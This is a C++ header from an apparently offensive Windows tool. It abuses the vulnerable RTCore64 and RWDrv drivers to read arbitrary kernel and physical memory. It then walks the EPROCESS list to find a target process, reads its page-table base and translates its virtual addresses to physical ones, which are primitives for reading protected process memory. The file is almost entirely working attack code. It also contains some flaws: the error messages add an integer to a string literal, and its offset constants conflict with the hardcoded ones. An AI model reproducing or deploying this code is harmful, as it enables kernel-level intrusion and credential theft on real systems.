#pragma once

#include "RTCore64.h"
#include "RWDrv.h"

#include <winternl.h>
#include <windows.h>
#include <cstdint>
#include <stdexcept>
#include <Psapi.h>

/***************************************************************
   Reading Arbitrary memory implemented using RTCore64
   Reading Physical memory is implemented using RWDrv or NTIOLib
***************************************************************/

#define PAGE_OFFSET_SIZE 12
#define PMASK (~0ull << 12)

#define W10_APL_OFFSET 0x2f0
#define W10_PID_OFFSET 0x2e8
#define W10_IMG_FN_OFFSET 0x450
#define W10_SEC_BASE_ADDR_OFFSET 0x3c0

namespace MemoryManager
{
	static HANDLE hDeviceRTCore64;
	static HANDLE hDeviceRWDrv;


	static void OpenDrivers()
	{
		hDeviceRTCore64 = OpenDriverRTCore64();
		hDeviceRWDrv = OpenDriverRWDrv();


		if (hDeviceRTCore64 == INVALID_HANDLE_VALUE)
		{
			throw std::runtime_error("Failed to open RTCore64. Make sure the driver is loaded.");
		}
		if (hDeviceRWDrv == INVALID_HANDLE_VALUE)
		{
			throw std::runtime_error("Failed to open RWDrv. Make sure the driver is loaded.");
		}
	}
	static void CloseDrivers()
	{
		CloseHandle(hDeviceRTCore64);
		CloseHandle(hDeviceRWDrv);
	}

	static void ReadArbitraryMemory(uint64_t addressToRead, unsigned char* buffer, uintptr_t sizeToRead)
	{
		if (!ReadArbitraryMemoryRTCore64(hDeviceRTCore64, addressToRead, buffer, sizeToRead)) {
			throw std::runtime_error("ReadArbitraryMemory[KERNEL Memory] error on address:" + addressToRead);
		}
	}
	static void ReadPhysicalMemory(uint64_t addressToRead, unsigned char* buffer, uintptr_t sizeToRead)
	{
		if (!ReadPhysicalMemoryRWDrv(hDeviceRWDrv, addressToRead, buffer, sizeToRead)) {
			throw std::runtime_error("ReadPhysicalMemory error on address:" + addressToRead);
		}
	}
	static LPVOID GetKernelBaseAddress() {
		DWORD cbNeeded;
		LPVOID* drivers = NULL;

		if (!EnumDeviceDrivers(NULL, 0, &cbNeeded)) {
			throw std::runtime_error("GetKernelBaseAddress: EnumDeviceDrivers - Get drivers count");
		}
		drivers = (LPVOID*)LocalAlloc(LPTR, cbNeeded);
		if (drivers == NULL) {
			throw std::runtime_error("GetKernelBaseAddress: LocalAlloc - Memory allocation failed");
		}
		if (!EnumDeviceDrivers(drivers, cbNeeded, &cbNeeded)) {
			LocalFree(drivers);
			throw std::runtime_error("GetKernelBaseAddress: EnumDeviceDrivers - Return kernel driver");
		}

		LPVOID kernelBaseAddress = drivers[0];
		LocalFree(drivers);
		return kernelBaseAddress;
	}
	static uintptr_t GetPsInitialSystemProcessOffsetInKernel() {
		HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
		if (ntoskrnl == NULL) {
			throw std::runtime_error("GetPsInitialSystemProcessOffsetInKernel: LoadLibraryA - Library loading failed");
		}
		uintptr_t psInitialSystemProcessOffsetInKernel;

		uintptr_t psInitialSystemProcess = (uintptr_t)GetProcAddress(ntoskrnl, "PsInitialSystemProcess");
		if (psInitialSystemProcess) {
			psInitialSystemProcessOffsetInKernel = psInitialSystemProcess - (uintptr_t)ntoskrnl;
			FreeLibrary(ntoskrnl);
			return psInitialSystemProcessOffsetInKernel;
		}
		FreeLibrary(ntoskrnl);
		throw std::runtime_error("GetPsInitialSystemProcessOffsetInKernel: psInitialSystemProcess is NULL");
	}
	static uintptr_t GetSystemEprocess() {
		uintptr_t kernelBase = (uintptr_t)GetKernelBaseAddress();

		uintptr_t pInitialSystemProcessOffset = GetPsInitialSystemProcessOffsetInKernel();

		uintptr_t pKernelInitialSystemProcess = kernelBase + pInitialSystemProcessOffset;
		uintptr_t pInitialSystemProcess;

		ReadArbitraryMemory(pKernelInitialSystemProcess, (unsigned char*)&pInitialSystemProcess, sizeof(pInitialSystemProcess));
		return pInitialSystemProcess;
	}
	static DWORD GetProcessIdByEprocess(ULONG_PTR eprocess) {
		ULONG_PTR pUniqueProcessId = eprocess + 0x2e0; //windows dependent offset should be here!     VOID* UniqueProcessId;    
		DWORD UniqueProcessId = 0;

		ReadArbitraryMemory(pUniqueProcessId, (unsigned char*)&UniqueProcessId, sizeof(UniqueProcessId));
		return UniqueProcessId;
	}
	static ULONG_PTR FindEprocessByPid(DWORD Pid) {
		ULONG_PTR CurrentEprocess = GetSystemEprocess();
		DWORD CurrentPid = GetProcessIdByEprocess(CurrentEprocess);

		ULONG_PTR Flink = 0;


		while (CurrentPid != Pid) {
			// read the address for the next EPROCESS in the list
			ReadArbitraryMemory(CurrentEprocess + 0x2e8, (unsigned char*)&Flink, sizeof(Flink)); //windows dependent offset should be here! struct _LIST_ENTRY ActiveProcessLinks; 
			// the address points to the Flink field, so we need to substract the offset of ActiveProcessLinks to get the base address of the EPROCESS structure
			CurrentEprocess = Flink - 0x2e8; //windows dependent offset should be here! struct _LIST_ENTRY ActiveProcessLinks; 
			CurrentPid = GetProcessIdByEprocess(CurrentEprocess);
		}

		return CurrentEprocess;
	}
	static uintptr_t GetKProcess(uintptr_t eprocessAddress) {
		return eprocessAddress + 0x0; //! windows dependent offset: KPROCESS
	}
	static uintptr_t GetDirectoryTableBase(ULONG_PTR kprocessAddress) {
		uintptr_t directoryTableBase;
		ReadArbitraryMemory(kprocessAddress + 0x28, (unsigned char*)&directoryTableBase, sizeof(directoryTableBase)); //! windows dependent offset: ULONGLONG DirectoryTableBase;  
		return directoryTableBase;
	}
	uint64_t VirtualToPhysical(uint64_t directoryTableBase, uint64_t virtualAddress) {
		// The virtual address is divided into several parts:
		// |----------------|-------------|------------|-------------|-----------|
		// | Sign extension | PML4 index  | PDPT index | PD index    | PT index  |
		// |----------------|-------------|------------|-------------|-----------|
		// | 16 bits        | 9 bits      | 9 bits     | 9 bits      | 9 bits    |
		// |----------------|-------------|------------|-------------|-----------|

		// Masks and shifts for the different parts of the virtual address
		const uint64_t INDEX_MASK = 0x1FF;
		const uint64_t PML4_SHIFT = 39;
		const uint64_t PDPT_SHIFT = 30;
		const uint64_t PD_SHIFT = 21;
		const uint64_t PT_SHIFT = 12;
		const uint64_t OFFSET_MASK = 0xFFF;
		const uint64_t BASE_ADDRESS_MASK = 0xFFFFFFFFFF000;


		// Extract the indices and the offset from the virtual address
		uint64_t PML4Index = (virtualAddress >> PML4_SHIFT) & INDEX_MASK;
		uint64_t PDPTIndex = (virtualAddress >> PDPT_SHIFT) & INDEX_MASK;
		uint64_t PDIndex = (virtualAddress >> PD_SHIFT) & INDEX_MASK;
		uint64_t PTIndex = (virtualAddress >> PT_SHIFT) & INDEX_MASK;
		uint64_t offset = virtualAddress & OFFSET_MASK;

		// Calculate the physical address of the PML4 entry
		uint64_t PML4Address = directoryTableBase + PML4Index * sizeof(uint64_t);
		uint64_t PML4Content;
		ReadPhysicalMemory(PML4Address, reinterpret_cast<unsigned char*>(&PML4Content), sizeof(uint64_t));

		// Check if the PML4 entry is present
		if ((PML4Content & 1) == 0) {
			throw std::runtime_error("Virtual address PML4Content is not present in memory");
		}

		// Calculate the physical address of the PDPT entry
		uint64_t PDPTBase = PML4Content & BASE_ADDRESS_MASK;
		uint64_t PDPTAddress = PDPTBase + PDPTIndex * sizeof(uint64_t);
		uint64_t PDPTContent;
		ReadPhysicalMemory(PDPTAddress, reinterpret_cast<unsigned char*>(&PDPTContent), sizeof(uint64_t));

		// Check if the PDPT entry is present
		if ((PDPTContent & 1) == 0) {
			throw std::runtime_error("Virtual address PDPTContent is not present in memory");
		}

		// Calculate the physical address of the PD entry
		uint64_t PDBase = PDPTContent & BASE_ADDRESS_MASK;
		uint64_t PDAddress = PDBase + PDIndex * sizeof(uint64_t);
		uint64_t PDContent;
		ReadPhysicalMemory(PDAddress, reinterpret_cast<unsigned char*>(&PDContent), sizeof(uint64_t));

		// Check if the PD entry is present
		if ((PDContent & 1) == 0) {
			throw std::runtime_error("Virtual address PDContent is not present in memory");
		}

		// Calculate the physical address of the PT entry
		uint64_t PTBase = PDContent & BASE_ADDRESS_MASK;
		uint64_t PTAddress = PTBase + PTIndex * sizeof(uint64_t);
		uint64_t PTContent;
		ReadPhysicalMemory(PTAddress, reinterpret_cast<unsigned char*>(&PTContent), sizeof(uint64_t));

		// Check if the PT entry is present
		if ((PTContent & 1) == 0) {
			throw std::runtime_error("Virtual address PTContent is not present in memory");
		}

		// Calculate the physical address by adding the offset to the base address of the page
		uint64_t PhysicalBase = PTContent & BASE_ADDRESS_MASK;
		uint64_t physicalAddress = PhysicalBase + offset;

		return physicalAddress;
	}
};
